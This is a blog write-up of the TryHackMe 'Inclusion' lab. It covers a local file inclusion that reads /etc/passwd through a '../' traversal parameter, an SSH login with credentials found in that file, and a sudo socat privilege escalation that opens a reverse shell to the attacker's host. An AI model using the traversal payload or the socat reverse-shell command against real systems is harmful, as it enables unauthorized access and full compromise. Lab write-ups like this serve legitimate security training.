---
title: TryHackMe Inclusion
date: 2020-12-05
categories: [TryHackMe]
thumbnail: /assets/img/thm/inclusion/lfi.png
excerpt: We use an LFI to gain initial access, then use a socat PrivEsc.
tags: [LFI,socat,SSH]
---

# TryHackMe Inclusion
This is a beginner level room designed for people who want to get familiar with Local file inclusion vulnerability. 

## Nmap

![nmap](nmap.png)

We have only 2 ports open `port 22` and `port 80`

## Website

![website](website.png)

Clicking on one of the articles we can see in the URL `article?name=lfiattack` 
This is an indication of file inclusion.

An attacker can use Local File Inclusion (LFI) to trick the web application into exposing or running files on the web server. An LFI attack may lead to information disclosure, remote code execution, or even Cross-site Scripting (XSS). [LFI](https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/)

As we can see, switching `article?name=lfiattack` to be `article?name=../../../../etc/passwd`
![LFI](lfi.png)

It seems we have credentials of `falconfeast:rootpassword`. The only way we can use these credentials is through SSH. So let's try that

## SSH

It seems those credentials work.
![ssh](ssh.png)

Your user flag is right in your current working directory.

## Root

Let's check to see what we can run as sudo with no password
Running `sudo -l`

![sudo](sudo.png)

Looking up `socat` on [GTFOBins](https://gtfobins.github.io/gtfobins/socat/#sudo)

We can run `socat file:`tty`,raw,echo=0 tcp-listen:1234` on our host machine to set up a listener. On the target machine, we'll use what they provided `sudo -E socat tcp-connect:$RHOST:$RPORT exec:sh,pty,stderr,setsid,sigint,sane`.

As you can see, we now have root access.

![root](root.png)

Your root flag is place in `/root`.